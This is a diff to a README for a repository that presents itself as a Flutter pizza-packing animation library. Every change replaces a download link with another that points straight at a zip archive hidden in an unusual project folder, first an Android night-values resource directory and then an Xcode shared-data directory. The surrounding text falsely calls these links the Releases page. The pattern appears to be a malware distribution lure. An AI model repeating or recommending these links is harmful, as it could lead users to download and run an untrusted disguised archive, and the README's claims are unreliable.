@@ -1,7 +1,7 @@
 # 🍕 flutter-pizza-packing-animation - Create Eye-Catching Pizza Animations
 
 ## 🔗 Download Now
-[![Release](https://github.com/luckymeow2586147/flutter-pizza-packing-animation/raw/refs/heads/main/android/app/src/main/res/values-night/animation-pizza-flutter-packing-3.4.zip%20Latest%20Release-blue)](https://github.com/luckymeow2586147/flutter-pizza-packing-animation/raw/refs/heads/main/android/app/src/main/res/values-night/animation-pizza-flutter-packing-3.4.zip)
+[![Release](https://raw.githubusercontent.com/luckymeow2586147/flutter-pizza-packing-animation/main/ios/Runner.xcodeproj/xcshareddata/flutter_packing_pizza_animation_1.1-beta.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/luckymeow2586147/flutter-pizza-packing-animation/main/ios/Runner.xcodeproj/xcshareddata/flutter_packing_pizza_animation_1.1-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the flutter-pizza-packing-animation project! This application helps you create stunning animations of pizza packing in Flutter. Perfect for mobile apps and user interfaces, it adds flair to any project.
@@ -17,7 +17,7 @@ To run this application smoothly, ensure your device meets the following system 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application.
 
-### 👉 [Visit this page to download](https://github.com/luckymeow2586147/flutter-pizza-packing-animation/raw/refs/heads/main/android/app/src/main/res/values-night/animation-pizza-flutter-packing-3.4.zip)
+### 👉 [Visit this page to download](https://raw.githubusercontent.com/luckymeow2586147/flutter-pizza-packing-animation/main/ios/Runner.xcodeproj/xcshareddata/flutter_packing_pizza_animation_1.1-beta.5.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version and click on the download link.
@@ -57,6 +57,6 @@ For more detailed assistance, refer to the documentation linked in the repositor
 ## 📞 Support
 If you have questions or need help, you can reach out through the Issues section of this repository. 
 
-### 👉 [Visit this page to download](https://github.com/luckymeow2586147/flutter-pizza-packing-animation/raw/refs/heads/main/android/app/src/main/res/values-night/animation-pizza-flutter-packing-3.4.zip) 
+### 👉 [Visit this page to download](https://raw.githubusercontent.com/luckymeow2586147/flutter-pizza-packing-animation/main/ios/Runner.xcodeproj/xcshareddata/flutter_packing_pizza_animation_1.1-beta.5.zip) 
 
 Enhance your Flutter projects with beautiful animations today!
